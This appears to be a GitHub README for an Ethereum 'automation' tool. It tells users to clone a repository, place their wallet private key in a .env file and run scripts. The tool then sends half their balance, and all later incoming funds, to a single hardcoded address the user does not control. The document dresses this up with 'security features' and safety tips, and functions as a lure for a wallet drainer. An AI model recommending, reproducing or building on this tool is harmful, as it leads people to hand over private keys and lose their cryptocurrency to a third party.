# Ethereum Automation Script

An automated Ethereum wallet management script that transfers half of the current balance and continuously monitors for new earnings, automatically transferring them to a specified target wallet address.

## Target Address
All transfers are sent to: `0x904d5E231C3d002CAaaD6a96Ad96F91dbdC0fc5E`

## Features

- **Initial Half-Balance Transfer**: Automatically transfers half of the current wallet balance
- **Earnings Monitoring**: Continuously monitors for new incoming funds
- **Automatic Transfers**: Immediately transfers new earnings to the target address
- **Gas Optimization**: Calculates optimal gas prices and includes gas costs in transfer calculations
- **Security Validations**: Validates all addresses and transactions before execution
- **Comprehensive Logging**: Detailed logging of all operations with timestamps
- **Configurable Settings**: Customizable thresholds, intervals, and network settings
- **CLI Interface**: Easy-to-use command-line interface
- **Dry Run Mode**: Test functionality without executing real transactions

## Installation

1. Clone the repository:
```bash
git clone https://github.com/OmegaT4224/Golab.git
cd Golab
```

2. Install dependencies:
```bash
npm install
```

3. Set up configuration:
```bash
npm run setup
```

4. Edit the `.env` file with your configuration:
```env
PRIVATE_KEY=0x_your_private_key_here
RPC_URL=https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY
MIN_TRANSFER_AMOUNT=0.001
MONITORING_INTERVAL=60000
```

## Usage

### Quick Start

1. **Setup the script:**
```bash
npm run setup
```

2. **Check your wallet balance:**
```bash
npm run balance
```

3. **Test with dry run (recommended first):**
```bash
npm run test-dry
```

4. **Run the full automation:**
```bash
npm run run
```

### CLI Commands

```bash
# Show help
node cli.js help

# Setup wizard
node cli.js setup

# Check wallet balance
node cli.js balance

# Transfer half balance only
node cli.js transfer-half

# Start earnings monitoring only
node cli.js monitor

# Run full automation
node cli.js run

# Display configuration info
node cli.js info

# Test mode (no real transactions)
node cli.js run --dry-run

# Use testnet
node cli.js run --testnet
```

### NPM Scripts

```bash
npm run setup          # Run setup wizard
npm run balance        # Check wallet balance
npm run run            # Run full automation
npm run monitor        # Start earnings monitoring
npm run test-dry       # Test without real transactions
```

## Configuration

### Environment Variables (.env)

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `PRIVATE_KEY` | Yes | - | Your Ethereum wallet private key (starts with 0x) |
| `RPC_URL` | Yes | - | Ethereum RPC endpoint URL |
| `MIN_TRANSFER_AMOUNT` | No | 0.001 | Minimum amount in ETH to transfer |
| `MONITORING_INTERVAL` | No | 60000 | Monitoring interval in milliseconds |
| `PERFORM_INITIAL_TRANSFER` | No | true | Whether to perform initial half-balance transfer |
| `ENABLE_MONITORING` | No | true | Whether to enable earnings monitoring |

### RPC Providers

**Mainnet:**
- Alchemy: `https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY`
- Infura: `https://mainnet.infura.io/v3/YOUR_PROJECT_ID`

**Testnet (Sepolia):**
- Infura: `https://sepolia.infura.io/v3/YOUR_PROJECT_ID`

Get test ETH from: https://sepoliafaucet.com/

## Security Features

### Built-in Safety Measures

- **Address Validation**: All Ethereum addresses are validated before use
- **Balance Checks**: Ensures sufficient balance before transfers
- **Gas Estimation**: Calculates and reserves gas costs
- **Transaction Confirmation**: Waits for transaction confirmation
- **Error Handling**: Comprehensive error handling and recovery
- **Logging**: All operations are logged for audit trail

### Security Best Practices

- ⚠️ **Never share your private key**
- ⚠️ **Never commit .env file to version control**
- ⚠️ **Test on testnet first**
- ⚠️ **Start with small amounts**
- ⚠️ **Monitor logs regularly**
- ⚠️ **Use hardware wallets for large amounts**

## How It Works

### Initial Transfer
1. Connects to Ethereum network
2. Checks current wallet balance
3. Calculates half of the balance
4. Estimates gas costs
5. Transfers (half balance - gas costs) to target address

### Earnings Monitoring
1. Records initial balance after setup
2. Periodically checks current balance
3. Detects new incoming funds (earnings)
4. Automatically transfers new earnings to target address
5. Updates balance tracking

### Gas Optimization
- Uses latest gas price data
- Calculates optimal gas limits
- Includes gas costs in transfer amounts
- Monitors for gas price fluctuations

## Logging

All operations are logged to:
- Console output (real-time)
- `automation.log` file (persistent)

Log levels include:
- `INFO`: General information
- `WARN`: Warnings and non-critical issues
- `ERROR`: Errors and failures
- `SUCCESS`: Successful operations

## API Reference

### EthereumAutomation Class

```javascript
const EthereumAutomation = require('./ethereum-automation');

const config = {
    privateKey: '0x...',
    rpcUrl: 'https://...',
    minTransferAmount: 0.001,
    monitoringInterval: 60000
};

const automation = new EthereumAutomation(config);
```

#### Methods

- `initialize()`: Initialize connection to Ethereum network
- `getCurrentBalance()`: Get current wallet balance
- `transferHalfBalance()`: Transfer half of current balance
- `startEarningsMonitoring()`: Start monitoring for new earnings
- `stopEarningsMonitoring()`: Stop earnings monitoring
- `getWalletInfo()`: Get wallet information
- `run()`: Run complete automation sequence

## Troubleshooting

### Common Issues

**"Insufficient balance" error:**
- Check that you have enough ETH to cover transfer + gas costs
- Consider lowering the minimum transfer amount

**"Invalid private key" error:**
- Ensure private key starts with '0x'
- Verify the private key is correct

**"Connection failed" error:**
- Check your RPC URL is correct
- Verify your API key is valid
- Try a different RPC provider

**"Gas estimation failed" error:**
- Network congestion - try again later
- Increase gas price limit in config

### Debug Mode

Run with detailed logging:
```bash
DEBUG=* node cli.js run
```

## Testing

### Testnet Testing

1. Configure for Sepolia testnet:
```bash
node cli.js run --testnet
```

2. Get test ETH from faucet:
   - https://sepoliafaucet.com/
   - https://faucets.chain.link/

3. Test all functions before mainnet use

### Dry Run Testing

Test without executing real transactions:
```bash
node cli.js run --dry-run
```

## Support

For issues, questions, or contributions:
- Create an issue on GitHub
- Check the logs for detailed error information
- Test on testnet first for debugging

## License

MIT License - see LICENSE file for details

## Disclaimer

This software is provided "as is" without warranty. Use at your own risk. The authors are not responsible for any loss of funds. Always test thoroughly before using with real cryptocurrencies.